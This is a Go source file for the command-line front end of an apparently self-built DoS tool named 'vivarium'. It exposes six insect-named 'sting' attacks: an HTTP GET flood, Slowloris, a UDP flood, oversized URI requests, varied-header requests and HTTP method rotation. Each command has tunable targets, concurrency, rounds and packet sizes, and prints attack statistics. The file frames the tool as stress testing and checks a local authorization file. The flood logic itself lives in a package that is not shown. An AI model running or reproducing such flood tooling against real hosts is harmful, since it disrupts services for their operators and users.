package cli

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/spf13/cobra"

	"vivarium/internal/common"
	"vivarium/internal/sting"
)

var (
	stingTarget      string
	stingRounds      int
	stingConcurrency int
	stingDelay       time.Duration
	stingSockets     int
	stingPort        int
	stingPacketSize  int
)

// stingCmd represents the sting command group
var stingCmd = &cobra.Command{
	Use:   "sting",
	Short: "Execute precision DoS attacks (single-origin)",
	Long: `Sting attacks are precision strikes from the Queen herself.
These are single-origin DoS attacks designed for stress testing.

Available stings:
  locust    - HTTP GET flood (devours resources with overwhelming speed)
  tick      - Slowloris (latches on slowly, drains over time)
  flyswarm  - UDP flood (chaotic bombardment)
  pollen    - Oversized URI path attack (scatters like pollen)
  firefly   - Varied HTTP headers (lights up like bioluminescence)
  molt      - HTTP method stress (sheds methods like exoskeleton)`,
}

// locustCmd represents the locust attack
var locustCmd = &cobra.Command{
	Use:   "locust",
	Short: "HTTP GET flood attack (like LOIC)",
	Long: `Locust devours resources with overwhelming speed.
Sends high-concurrency HTTP GET requests to the target.`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := common.RequireAuthorization(GetConfigPath()); err != nil {
			return err
		}
		if stingTarget == "" {
			return fmt.Errorf("--target is required")
		}

		fmt.Println("\n🦗 LOCUST - Devouring resources...")
		fmt.Printf("   Target: %s\n", stingTarget)
		fmt.Printf("   Rounds: %d\n", stingRounds)
		fmt.Printf("   Concurrency: %d\n", stingConcurrency)
		fmt.Println()

		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		// Handle graceful shutdown
		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		go func() {
			<-sigChan
			fmt.Println("\n\n🛑 Received interrupt, stopping attack...")
			cancel()
		}()

		opts := sting.AttackOpts{
			Rounds:      stingRounds,
			Concurrency: stingConcurrency,
			Delay:       stingDelay,
			Verbose:     IsVerbose(),
		}

		locust := sting.NewLocust()
		result, err := locust.Attack(ctx, stingTarget, opts)
		if err != nil {
			return fmt.Errorf("attack failed: %w", err)
		}

		fmt.Println("\n📊 Attack Results:")
		fmt.Printf("   Total requests: %d\n", result.TotalRequests)
		fmt.Printf("   Successful:     %d (%.1f%%)\n", result.Successful, float64(result.Successful)/float64(result.TotalRequests)*100)
		fmt.Printf("   Failed:         %d\n", result.Failed)
		fmt.Printf("   Duration:       %s\n", result.Duration.Round(time.Millisecond))
		fmt.Printf("   Requests/sec:   %.2f\n", float64(result.TotalRequests)/result.Duration.Seconds())

		return nil
	},
}

// tickCmd represents the tick (Slowloris) attack
var tickCmd = &cobra.Command{
	Use:   "tick",
	Short: "Slowloris connection drain attack",
	Long: `Tick latches on slowly and drains over time.
Opens many connections and sends partial headers slowly to exhaust server resources.`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := common.RequireAuthorization(GetConfigPath()); err != nil {
			return err
		}
		if stingTarget == "" {
			return fmt.Errorf("--target is required")
		}

		fmt.Println("\n🕷️ TICK - Latching on slowly...")
		fmt.Printf("   Target: %s\n", stingTarget)
		fmt.Printf("   Sockets: %d\n", stingSockets)
		fmt.Printf("   Header delay: %s\n", stingDelay)
		fmt.Println()

		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		// Handle graceful shutdown
		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		go func() {
			<-sigChan
			fmt.Println("\n\n🛑 Received interrupt, releasing connections...")
			cancel()
		}()

		opts := sting.AttackOpts{
			Sockets: stingSockets,
			Delay:   stingDelay,
			Verbose: IsVerbose(),
		}

		tick := sting.NewTick()
		result, err := tick.Attack(ctx, stingTarget, opts)
		if err != nil {
			return fmt.Errorf("attack failed: %w", err)
		}

		fmt.Println("\n📊 Attack Results:")
		fmt.Printf("   Connections opened: %d\n", result.TotalRequests)
		fmt.Printf("   Still alive:        %d\n", result.Successful)
		fmt.Printf("   Dropped:            %d\n", result.Failed)
		fmt.Printf("   Duration:           %s\n", result.Duration.Round(time.Second))

		return nil
	},
}

// flyswarmCmd represents the UDP flood attack
var flyswarmCmd = &cobra.Command{
	Use:   "flyswarm",
	Short: "UDP flood attack",
	Long: `Fly Swarm unleashes chaotic UDP bombardment.
Sends random UDP packets to overwhelm the target.`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := common.RequireAuthorization(GetConfigPath()); err != nil {
			return err
		}
		if stingTarget == "" {
			return fmt.Errorf("--target is required")
		}

		fmt.Println("\n🪰 FLY SWARM - Chaotic bombardment...")
		fmt.Printf("   Target: %s:%d\n", stingTarget, stingPort)
		fmt.Printf("   Rounds: %d\n", stingRounds)
		fmt.Printf("   Packet size: %d bytes\n", stingPacketSize)
		fmt.Println()

		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		// Handle graceful shutdown
		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		go func() {
			<-sigChan
			fmt.Println("\n\n🛑 Received interrupt, stopping swarm...")
			cancel()
		}()

		opts := sting.AttackOpts{
			Rounds:      stingRounds,
			Concurrency: stingConcurrency,
			Port:        stingPort,
			PacketSize:  stingPacketSize,
			Verbose:     IsVerbose(),
		}

		flyswarm := sting.NewFlySwarm()
		result, err := flyswarm.Attack(ctx, stingTarget, opts)
		if err != nil {
			return fmt.Errorf("attack failed: %w", err)
		}

		fmt.Println("\n📊 Attack Results:")
		fmt.Printf("   Packets sent:   %d\n", result.TotalRequests)
		fmt.Printf("   Successful:     %d\n", result.Successful)
		fmt.Printf("   Failed:         %d\n", result.Failed)
		fmt.Printf("   Duration:       %s\n", result.Duration.Round(time.Millisecond))
		fmt.Printf("   Packets/sec:    %.2f\n", float64(result.TotalRequests)/result.Duration.Seconds())
		fmt.Printf("   Bandwidth:      %.2f MB/s\n", float64(result.Successful*stingPacketSize)/result.Duration.Seconds()/1024/1024)

		return nil
	},
}

// pollenCmd represents the pollen burst attack
var pollenCmd = &cobra.Command{
	Use:   "pollen",
	Short: "Pollen Burst - oversized URI path attack",
	Long: `Pollen Burst scatters oversized URI requests.
Exploits buffer handling with very long URL paths.`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := common.RequireAuthorization(GetConfigPath()); err != nil {
			return err
		}
		if stingTarget == "" {
			return fmt.Errorf("--target is required")
		}

		fmt.Println("\n🌸 POLLEN BURST - Scattering oversized requests...")
		fmt.Printf("   Target: %s\n", stingTarget)
		fmt.Printf("   Rounds: %d\n", stingRounds)
		fmt.Printf("   Concurrency: %d\n", stingConcurrency)
		fmt.Println()

		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		go func() {
			<-sigChan
			fmt.Println("\n\n🛑 Received interrupt, stopping attack...")
			cancel()
		}()

		opts := sting.AttackOpts{
			Rounds:      stingRounds,
			Concurrency: stingConcurrency,
			Delay:       stingDelay,
			Verbose:     IsVerbose(),
		}

		pollen := sting.NewPollen()
		result, err := pollen.Attack(ctx, stingTarget, opts)
		if err != nil {
			return fmt.Errorf("attack failed: %w", err)
		}

		fmt.Println("\n📊 Attack Results:")
		fmt.Printf("   Total requests: %d\n", result.TotalRequests)
		fmt.Printf("   Successful:     %d (%.1f%%)\n", result.Successful, float64(result.Successful)/float64(result.TotalRequests)*100)
		fmt.Printf("   Failed:         %d\n", result.Failed)
		fmt.Printf("   Duration:       %s\n", result.Duration.Round(time.Millisecond))
		fmt.Printf("   Requests/sec:   %.2f\n", float64(result.TotalRequests)/result.Duration.Seconds())

		return nil
	},
}

// fireflyCmd represents the firefly (XMAS) attack
var fireflyCmd = &cobra.Command{
	Use:   "firefly",
	Short: "Firefly - varied unusual HTTP headers attack",
	Long: `Firefly lights up requests with varied unusual headers.
Like bioluminescence, each request pattern is unique.`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := common.RequireAuthorization(GetConfigPath()); err != nil {
			return err
		}
		if stingTarget == "" {
			return fmt.Errorf("--target is required")
		}

		fmt.Println("\n🪲 FIREFLY - Lighting up with varied headers...")
		fmt.Printf("   Target: %s\n", stingTarget)
		fmt.Printf("   Rounds: %d\n", stingRounds)
		fmt.Printf("   Concurrency: %d\n", stingConcurrency)
		fmt.Println()

		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		go func() {
			<-sigChan
			fmt.Println("\n\n🛑 Received interrupt, stopping attack...")
			cancel()
		}()

		opts := sting.AttackOpts{
			Rounds:      stingRounds,
			Concurrency: stingConcurrency,
			Delay:       stingDelay,
			Verbose:     IsVerbose(),
		}

		firefly := sting.NewFirefly()
		result, err := firefly.Attack(ctx, stingTarget, opts)
		if err != nil {
			return fmt.Errorf("attack failed: %w", err)
		}

		fmt.Println("\n📊 Attack Results:")
		fmt.Printf("   Total requests: %d\n", result.TotalRequests)
		fmt.Printf("   Successful:     %d (%.1f%%)\n", result.Successful, float64(result.Successful)/float64(result.TotalRequests)*100)
		fmt.Printf("   Failed:         %d\n", result.Failed)
		fmt.Printf("   Duration:       %s\n", result.Duration.Round(time.Millisecond))
		fmt.Printf("   Requests/sec:   %.2f\n", float64(result.TotalRequests)/result.Duration.Seconds())

		return nil
	},
}

// moltCmd represents the molt (DROPER) attack
var moltCmd = &cobra.Command{
	Use:   "molt",
	Short: "Molt - HTTP method stress attack",
	Long: `Molt sheds varied HTTP methods like an insect shedding its exoskeleton.
Rotates through GET, POST, HEAD, OPTIONS, PUT, DELETE, PATCH.`,
	RunE: func(cmd *cobra.Command, args []string) error {
		if err := common.RequireAuthorization(GetConfigPath()); err != nil {
			return err
		}
		if stingTarget == "" {
			return fmt.Errorf("--target is required")
		}

		fmt.Println("\n🦎 MOLT - Shedding varied HTTP methods...")
		fmt.Printf("   Target: %s\n", stingTarget)
		fmt.Printf("   Rounds: %d\n", stingRounds)
		fmt.Printf("   Concurrency: %d\n", stingConcurrency)
		fmt.Println()

		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		go func() {
			<-sigChan
			fmt.Println("\n\n🛑 Received interrupt, stopping attack...")
			cancel()
		}()

		opts := sting.AttackOpts{
			Rounds:      stingRounds,
			Concurrency: stingConcurrency,
			Delay:       stingDelay,
			Verbose:     IsVerbose(),
		}

		molt := sting.NewMolt()
		result, err := molt.Attack(ctx, stingTarget, opts)
		if err != nil {
			return fmt.Errorf("attack failed: %w", err)
		}

		fmt.Println("\n📊 Attack Results:")
		fmt.Printf("   Total requests: %d\n", result.TotalRequests)
		fmt.Printf("   Successful:     %d (%.1f%%)\n", result.Successful, float64(result.Successful)/float64(result.TotalRequests)*100)
		fmt.Printf("   Failed:         %d\n", result.Failed)
		fmt.Printf("   Duration:       %s\n", result.Duration.Round(time.Millisecond))
		fmt.Printf("   Requests/sec:   %.2f\n", float64(result.TotalRequests)/result.Duration.Seconds())

		return nil
	},
}

func init() {
	// Locust flags
	locustCmd.Flags().StringVarP(&stingTarget, "target", "t", "", "target URL (required)")
	locustCmd.Flags().IntVarP(&stingRounds, "rounds", "r", 1000, "number of requests to send")
	locustCmd.Flags().IntVarP(&stingConcurrency, "concurrency", "c", 100, "number of concurrent workers")
	locustCmd.Flags().DurationVarP(&stingDelay, "delay", "d", 0, "delay between requests per worker")

	// Tick flags
	tickCmd.Flags().StringVarP(&stingTarget, "target", "t", "", "target URL (required)")
	tickCmd.Flags().IntVarP(&stingSockets, "sockets", "s", 200, "number of sockets to open")
	tickCmd.Flags().DurationVarP(&stingDelay, "delay", "d", 15*time.Second, "delay between sending headers")

	// Flyswarm flags
	flyswarmCmd.Flags().StringVarP(&stingTarget, "target", "t", "", "target IP address (required)")
	flyswarmCmd.Flags().IntVarP(&stingPort, "port", "p", 80, "target port")
	flyswarmCmd.Flags().IntVarP(&stingRounds, "rounds", "r", 10000, "number of packets to send")
	flyswarmCmd.Flags().IntVarP(&stingConcurrency, "concurrency", "c", 100, "number of concurrent workers")
	flyswarmCmd.Flags().IntVarP(&stingPacketSize, "size", "s", 1024, "packet size in bytes")

	// Pollen flags
	pollenCmd.Flags().StringVarP(&stingTarget, "target", "t", "", "target URL (required)")
	pollenCmd.Flags().IntVarP(&stingRounds, "rounds", "r", 1000, "number of requests to send")
	pollenCmd.Flags().IntVarP(&stingConcurrency, "concurrency", "c", 100, "number of concurrent workers")
	pollenCmd.Flags().DurationVarP(&stingDelay, "delay", "d", 0, "delay between requests per worker")

	// Firefly flags
	fireflyCmd.Flags().StringVarP(&stingTarget, "target", "t", "", "target URL (required)")
	fireflyCmd.Flags().IntVarP(&stingRounds, "rounds", "r", 1000, "number of requests to send")
	fireflyCmd.Flags().IntVarP(&stingConcurrency, "concurrency", "c", 100, "number of concurrent workers")
	fireflyCmd.Flags().DurationVarP(&stingDelay, "delay", "d", 0, "delay between requests per worker")

	// Molt flags
	moltCmd.Flags().StringVarP(&stingTarget, "target", "t", "", "target URL (required)")
	moltCmd.Flags().IntVarP(&stingRounds, "rounds", "r", 1000, "number of requests to send")
	moltCmd.Flags().IntVarP(&stingConcurrency, "concurrency", "c", 100, "number of concurrent workers")
	moltCmd.Flags().DurationVarP(&stingDelay, "delay", "d", 0, "delay between requests per worker")

	stingCmd.AddCommand(locustCmd)
	stingCmd.AddCommand(tickCmd)
	stingCmd.AddCommand(flyswarmCmd)
	stingCmd.AddCommand(pollenCmd)
	stingCmd.AddCommand(fireflyCmd)
	stingCmd.AddCommand(moltCmd)
}
